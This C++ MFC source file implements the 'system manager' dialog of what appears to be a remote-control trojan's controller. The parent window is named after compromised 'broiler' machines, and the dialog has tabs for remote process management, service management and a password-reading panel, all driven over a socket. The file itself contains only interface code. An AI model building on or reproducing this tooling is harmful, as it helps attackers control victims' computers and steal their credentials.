// SystemManager.cpp : 实现文件
//

#include "stdafx.h"
#include "Client.h"
#include "SystemManager.h"
#include "BroilerData.h"

static UINT idArray[] = {ID_RES_SYSTEM1,     //状态栏
                         ID_RES_SYSTEM2};


// CSystemManager 对话框

IMPLEMENT_DYNAMIC(CSystemManager, CDialog)

CSystemManager::CSystemManager(CWnd* pParent /*=NULL*/, SOCKET sock)
	: CDialog(CSystemManager::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDI_ICON_SYS_MANAGER);
	m_socket = sock;
}

CSystemManager::~CSystemManager()
{
}

void CSystemManager::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_TAB_SYSTEM, m_sysTab);
}


BEGIN_MESSAGE_MAP(CSystemManager, CDialog)
	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB_SYSTEM, &CSystemManager::OnTcnSelchangeTabSystem)
END_MESSAGE_MAP()


// CSystemManager 消息处理程序
BOOL CSystemManager::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类
	if ( WM_KEYDOWN == pMsg->message)
	{
		int nVirtKey = (int)pMsg->wParam;
		if (VK_RETURN == nVirtKey || VK_ESCAPE == nVirtKey)  //如果按下的是回车键或ESC键，则截断消息
		{
			return TRUE;
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}

BOOL CSystemManager::OnInitDialog()
{
	CDialog::OnInitDialog();
    SetIcon(m_hIcon, TRUE);
	// TODO:  在此添加额外的初始化
    DlgInit();
	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

void CSystemManager::DlgInit()
{
	m_ImageTab.Create(16, 16, ILC_COLOR24|ILC_MASK, 1, 1);
	HICON hIcon[3];
	hIcon[0] = (HICON)(AfxGetApp()->LoadIcon(IDI_ICON_SYSPROG));
	hIcon[1] = (HICON)(AfxGetApp()->LoadIcon(IDI_ICON_SYSSERVER));
    hIcon[2] = (HICON)(AfxGetApp()->LoadIcon(IDI_ICON_READPSW));
	for(int i = 0; i < 3; i++)
	{
		m_ImageTab.Add(hIcon[i]);
	}
	m_sysTab.SetImageList(&m_ImageTab);
	
	m_sysTab.InsertItem(0, _T("进程管理"), 0);
	m_sysTab.InsertItem(1, _T("服务管理"), 1);
	m_sysTab.InsertItem(2, _T("帐号信息"), 2);

	m_progressDlg = new CProgressDlg(this, m_socket);
	m_progressDlg->Create(IDD_DLG_PROGRESS, &m_sysTab);
	CRect rect;
	m_sysTab.GetClientRect(rect);  //获取Tab的区域大小
	rect.DeflateRect(0, 20, 0, 0);  //缩小
	m_progressDlg->MoveWindow(rect);

	m_pSysServerDlg = new CSystemServerDlg(this, m_socket);
	m_pSysServerDlg->Create(IDD_DLG_SERVER, &m_sysTab);
	m_sysTab.GetClientRect(rect);  //获取Tab的区域大小
	rect.DeflateRect(0, 20, 0, 0);  //缩小
	m_pSysServerDlg->MoveWindow(rect);

	m_pReadPswSlg = new CReadPswDlg(this, m_socket);
	m_pReadPswSlg->Create(IDD_DLG_READPSW, &m_sysTab);
	m_sysTab.GetClientRect(rect);  //获取Tab的区域大小
	rect.DeflateRect(0, 20, 0, 0);  //缩小
	m_pReadPswSlg->MoveWindow(rect);

	m_sysStatusBar.Create(this);
	m_sysStatusBar.SetIndicators(idArray, sizeof(idArray) / sizeof(UINT));
	m_sysStatusBar.SetPaneInfo(0, idArray[0], SBPS_NORMAL, 400);
	m_sysStatusBar.SetPaneInfo(1, idArray[1], SBPS_NORMAL, 200);
	m_sysStatusBar.SetPaneText(0 , _T("就绪"));
	m_sysStatusBar.SetPaneText(1 , _T(""));
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);  //显示工具栏和状态栏（这句话一定要加上, 否则工具栏不显示）

	m_progressDlg->ShowWindow(SW_SHOW);
	m_pSysServerDlg->ShowWindow(SW_HIDE);
	m_pReadPswSlg->ShowWindow(SW_HIDE);
}

void CSystemManager::OnTcnSelchangeTabSystem(NMHDR *pNMHDR, LRESULT *pResult)
{
	// TODO: 在此添加控件通知处理程序代码
	int nIndex = m_sysTab.GetCurFocus();   //得到当前索引
	switch (nIndex)
	{
	case 0:
		{
			m_progressDlg->ShowWindow(SW_SHOW);
			m_pSysServerDlg->ShowWindow(SW_HIDE);
			m_pReadPswSlg->ShowWindow(SW_HIDE);
		}
		break;
	case 1:
		{
			m_progressDlg->ShowWindow(SW_HIDE);
			m_pSysServerDlg->ShowWindow(SW_SHOW);
			m_pReadPswSlg->ShowWindow(SW_HIDE);
		}
		break;
	case 2:
		{
			m_progressDlg->ShowWindow(SW_HIDE);
			m_pSysServerDlg->ShowWindow(SW_HIDE);
			m_pReadPswSlg->ShowWindow(SW_SHOW);
		}
		break;
	default:
		break;
	}
	*pResult = 0;
}

void CSystemManager::PostNcDestroy()
{
	// TODO: 在此添加专用代码和/或调用基类
	CDialog::PostNcDestroy();
	((CBroilerData*)this->m_pParentWnd)->m_pSystemDlg = NULL;
}

void CSystemManager::OnCancel()
{
	// TODO: 在此添加专用代码和/或调用基类
    DestroyWindow();
	delete this;
}

